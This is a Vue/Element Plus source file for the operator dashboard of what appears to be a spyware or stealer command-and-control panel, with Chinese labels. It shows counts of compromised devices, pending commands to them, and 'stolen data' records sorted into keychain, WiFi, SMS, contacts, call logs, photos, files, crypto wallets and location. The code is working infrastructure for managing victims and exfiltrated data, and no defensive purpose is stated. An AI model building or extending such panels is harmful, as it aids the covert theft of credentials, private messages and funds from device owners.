<template>
  <div class="dashboard-page">
    <el-row :gutter="16">
      <el-col :span="6">
        <div class="stat-card" style="background:linear-gradient(135deg,#409eff,#66b1ff);position:relative;overflow:hidden;">
          <div class="stat-label">总访问量</div>
          <div class="stat-value">{{ stats.total_visits?.toLocaleString() || 0 }}</div>
          <el-icon class="stat-icon"><View /></el-icon>
        </div>
      </el-col>
      <el-col :span="6">
        <div class="stat-card" style="background:linear-gradient(135deg,#67c23a,#85ce61);position:relative;overflow:hidden;">
          <div class="stat-label">总设备数</div>
          <div class="stat-value">{{ stats.total_devices?.toLocaleString() || 0 }}</div>
          <el-icon class="stat-icon"><Iphone /></el-icon>
        </div>
      </el-col>
      <el-col :span="6">
        <div class="stat-card" style="background:linear-gradient(135deg,#e6a23c,#ebb563);position:relative;overflow:hidden;">
          <div class="stat-label">在线设备</div>
          <div class="stat-value">{{ stats.online_devices || 0 }}</div>
          <el-icon class="stat-icon"><Connection /></el-icon>
        </div>
      </el-col>
      <el-col :span="6">
        <div class="stat-card" style="background:linear-gradient(135deg,#f56c6c,#f78989);position:relative;overflow:hidden;">
          <div class="stat-label">待执行命令</div>
          <div class="stat-value">{{ stats.pending_commands || 0 }}</div>
          <el-icon class="stat-icon"><Promotion /></el-icon>
        </div>
      </el-col>
    </el-row>

    <el-row :gutter="16" style="margin-top:20px;">
      <el-col :span="16">
        <div class="page-card">
          <div class="page-header">
            <div>
              <div class="page-title">请求趋势（近 7 天）</div>
              <div class="page-subtitle">访问量与设备新增趋势</div>
            </div>
            <el-radio-group v-model="chartRange" size="small">
              <el-radio-button value="7d">近 7 天</el-radio-button>
              <el-radio-button value="30d">近 30 天</el-radio-button>
            </el-radio-group>
          </div>
          <div ref="chartRef" style="height:320px;"></div>
        </div>
      </el-col>
      <el-col :span="8">
        <div class="page-card">
          <div class="page-header">
            <div>
              <div class="page-title">窃取数据分类</div>
              <div class="page-subtitle">各类型数据量统计</div>
            </div>
          </div>
          <div ref="pieRef" style="height:320px;"></div>
        </div>
      </el-col>
    </el-row>

    <el-row :gutter="16" style="margin-top:20px;">
      <el-col :span="12">
        <div class="page-card">
          <div class="page-header">
            <div>
              <div class="page-title">最新设备</div>
              <div class="page-subtitle">最近上线的 10 台设备</div>
            </div>
            <el-button type="primary" link @click="goDevices">查看全部</el-button>
          </div>
          <el-table :data="latestDevices" size="small" stripe>
            <el-table-column prop="uuid" label="设备 UUID" width="140">
              <template #default="{ row }">
                <span class="mono text-muted">{{ shortUuid(row.uuid) }}</span>
              </template>
            </el-table-column>
            <el-table-column prop="os" label="系统" width="90" />
            <el-table-column prop="ip" label="IP" width="120" />
            <el-table-column prop="status" label="状态" width="80">
              <template #default="{ row }">
                <el-tag :type="row.status === 'online' ? 'success' : 'info'" size="small" effect="plain">
                  {{ row.status === 'online' ? '在线' : '离线' }}
                </el-tag>
              </template>
            </el-table-column>
            <el-table-column prop="first_seen" label="首次上线">
              <template #default="{ row }">
                <span class="text-muted">{{ formatRelative(row.first_seen) }}</span>
              </template>
            </el-table-column>
          </el-table>
        </div>
      </el-col>
      <el-col :span="12">
        <div class="page-card">
          <div class="page-header">
            <div>
              <div class="page-title">最近窃取数据</div>
              <div class="page-subtitle">最新的 10 条数据记录</div>
            </div>
            <el-button type="primary" link @click="goExfil">查看全部</el-button>
          </div>
          <el-table :data="recentExfil" size="small" stripe>
            <el-table-column prop="category" label="分类" width="100">
              <template #default="{ row }">
                <el-tag :type="catTag(row.category)" size="small" effect="plain">{{ row.category }}</el-tag>
              </template>
            </el-table-column>
            <el-table-column prop="device_uuid" label="设备" width="110">
              <template #default="{ row }">
                <span class="mono text-muted">{{ shortUuid(row.device_uuid) }}</span>
              </template>
            </el-table-column>
            <el-table-column prop="summary" label="摘要">
              <template #default="{ row }">
                <span class="text-ellipsis">{{ truncate(row.summary, 30) }}</span>
              </template>
            </el-table-column>
            <el-table-column prop="created_at" label="时间" width="110">
              <template #default="{ row }">
                <span class="text-muted">{{ formatRelative(row.created_at) }}</span>
              </template>
            </el-table-column>
          </el-table>
        </div>
      </el-col>
    </el-row>
  </div>
</template>

<script setup>
import { ref, onMounted, onBeforeUnmount, nextTick, watch } from 'vue'
import { useRouter } from 'vue-router'
import * as echarts from 'echarts'
import { View, Iphone, Connection, Promotion } from '@element-plus/icons-vue'
import axios from '../utils/axios'
import { formatRelative, shortUuid, truncate } from '../utils/twofa'

const router = useRouter()
const stats = ref({})
const latestDevices = ref([])
const recentExfil = ref([])
const chartRange = ref('7d')
const chartRef = ref(null)
const pieRef = ref(null)
let chart = null
let pie = null

function catTag(cat) {
  const map = {
    keychain: 'primary',
    wifi: 'success',
    contacts: 'warning',
    sms: 'danger',
    calls: 'info',
    photos: 'primary',
    files: 'success',
    wallets: 'warning'
  }
  return map[cat] || 'info'
}

function goDevices() {
  router.push('/devices')
}

function goExfil() {
  router.push('/exfil')
}

async function loadStats() {
  const days = chartRange.value === '30d' ? 30 : 7
  try {
    const res = await axios.get('/api/dashboard/stats', { params: { days } })
    stats.value = res.data || {}
  } catch (err) {
    const msg = err?.response?.data?.detail || err?.message || '统计数据加载失败'
    ElMessage.error(msg)
    stats.value = {}
  }
  try {
    const dres = await axios.get('/api/devices', { params: { limit: 10 } })
    latestDevices.value = dres.data?.items || dres.data?.devices || dres.data || []
  } catch (err) {
    const msg = err?.response?.data?.detail || err?.message || '设备列表加载失败'
    ElMessage.error(msg)
    latestDevices.value = []
  }
  try {
    const eres = await axios.get('/api/exfil', { params: { limit: 10 } })
    recentExfil.value = eres.data?.items || eres.data?.records || eres.data || []
  } catch (err) {
    const msg = err?.response?.data?.detail || err?.message || '数据窃取记录加载失败'
    ElMessage.error(msg)
    recentExfil.value = []
  }
  refreshCharts()
}

const PIE_COLORS = {
  keychain: '#409eff',
  wifi: '#67c23a',
  contacts: '#e6a23c',
  contact: '#e6a23c',
  sms: '#f56c6c',
  calls: '#909399',
  call: '#909399',
  photos: '#9b59b6',
  photo: '#9b59b6',
  wallets: '#16a085',
  wallet: '#16a085',
  files: '#2ecc71',
  file: '#2ecc71',
  location: '#e67e22',
  system_info: '#34495e',
  system: '#34495e'
}
const PIE_LABELS = {
  keychain: 'Keychain',
  wifi: 'WiFi',
  contacts: '通讯录',
  contact: '通讯录',
  sms: '短信',
  calls: '通话记录',
  call: '通话记录',
  photos: '照片',
  photo: '照片',
  wallets: '钱包',
  wallet: '钱包',
  files: '文件',
  file: '文件',
  location: '定位',
  system_info: '系统信息',
  system: '系统信息'
}

function initChart() {
  if (!chartRef.value) return
  chart = echarts.init(chartRef.value)
  chart.setOption({
    tooltip: { trigger: 'axis' },
    legend: { data: ['访问量', '新增设备'], top: 0 },
    grid: { left: 40, right: 20, top: 40, bottom: 30 },
    xAxis: { type: 'category', data: [], boundaryGap: false },
    yAxis: [{ type: 'value', name: '访问' }, { type: 'value', name: '设备' }],
    series: [
      {
        name: '访问量',
        type: 'line',
        smooth: true,
        data: [],
        areaStyle: { color: 'rgba(64,158,255,0.2)' },
        itemStyle: { color: '#409eff' },
        lineStyle: { width: 2 }
      },
      {
        name: '新增设备',
        type: 'line',
        smooth: true,
        yAxisIndex: 1,
        data: [],
        itemStyle: { color: '#67c23a' },
        lineStyle: { width: 2 }
      }
    ]
  })
}

function initPie() {
  if (!pieRef.value) return
  pie = echarts.init(pieRef.value)
  pie.setOption({
    tooltip: { trigger: 'item' },
    legend: { bottom: 0, left: 'center' },
    series: [
      {
        type: 'pie',
        radius: ['40%', '70%'],
        avoidLabelOverlap: true,
        itemStyle: { borderRadius: 6, borderColor: '#fff', borderWidth: 2 },
        label: { show: false },
        data: []
      }
    ]
  })
}

function refreshCharts() {
  const s = stats.value || {}
  if (chart) {
    const dates = Array.isArray(s.trend_dates) ? s.trend_dates : []
    const visits = Array.isArray(s.request_trend) ? s.request_trend : []
    const devices = Array.isArray(s.device_trend) ? s.device_trend : []
    chart.setOption({
      tooltip: { trigger: 'axis' },
      legend: { data: ['访问量', '新增设备'], top: 0 },
      grid: { left: 40, right: 20, top: 40, bottom: 30 },
      xAxis: { type: 'category', data: dates, boundaryGap: false },
      yAxis: [{ type: 'value', name: '访问' }, { type: 'value', name: '设备' }],
      series: [
        {
          name: '访问量',
          type: 'line',
          smooth: true,
          data: visits,
          areaStyle: { color: 'rgba(64,158,255,0.2)' },
          itemStyle: { color: '#409eff' },
          lineStyle: { width: 2 }
        },
        {
          name: '新增设备',
          type: 'line',
          smooth: true,
          yAxisIndex: 1,
          data: devices,
          itemStyle: { color: '#67c23a' },
          lineStyle: { width: 2 }
        }
      ]
    })
  }
  if (pie) {
    const bd = (s && typeof s.exfil_breakdown === 'object' && s.exfil_breakdown) ? s.exfil_breakdown : {}
    const rows = Object.keys(bd).map(k => {
      const key = String(k || '').toLowerCase()
      const cnt = Number.isFinite(Number(bd[k])) ? Number(bd[k]) : 0
      return {
        value: cnt,
        name: PIE_LABELS[key] || String(k || '其他'),
        itemStyle: { color: PIE_COLORS[key] || '#909399' }
      }
    }).filter(r => r.value > 0)
    pie.setOption({
      tooltip: { trigger: 'item' },
      legend: { bottom: 0, left: 'center' },
      series: [
        {
          type: 'pie',
          radius: ['40%', '70%'],
          avoidLabelOverlap: true,
          itemStyle: { borderRadius: 6, borderColor: '#fff', borderWidth: 2 },
          label: { show: false },
          data: rows
        }
      ]
    })
  }
}

function handleResize() {
  chart?.resize()
  pie?.resize()
}

watch(chartRange, async () => {
  await loadStats()
})

onMounted(async () => {
  await loadStats()
  await nextTick()
  initChart()
  initPie()
  refreshCharts()
  window.addEventListener('resize', handleResize)
})

onBeforeUnmount(() => {
  window.removeEventListener('resize', handleResize)
  chart?.dispose()
  pie?.dispose()
})
</script>
